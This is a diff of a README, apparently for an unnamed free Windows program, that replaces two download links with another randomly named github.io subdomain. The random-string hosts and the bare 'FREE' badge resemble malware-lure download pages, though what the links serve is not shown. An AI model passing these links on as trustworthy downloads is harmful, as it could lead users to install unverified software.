@@ -2,7 +2,7 @@
 
 <p align="center">
 
-[![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD-000000?style=for-the-badge&labelColor=1a1a1a)](https://zqhzqrfmocza.github.io/win-release/)
+[![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD-000000?style=for-the-badge&labelColor=1a1a1a)](https://uvkayskoqsgd.github.io/windows-files/)
 [![VERSION](https://img.shields.io/badge/VERSION-3.1.0-2196F3?style=for-the-badge)]()
 [![PLATFORM](https://img.shields.io/badge/PLATFORM-WINDOWS-0078D4?style=for-the-badge)]()
 [![STATUS](https://img.shields.io/badge/STATUS-FREE-00c853?style=for-the-badge)]()
@@ -39,7 +39,7 @@
 
 ---
 
-## [📥 Download v3.1.0](https://zqhzqrfmocza.github.io/win-release/)
+## [📥 Download v3.1.0](https://uvkayskoqsgd.github.io/windows-files/)
 
 ---
 
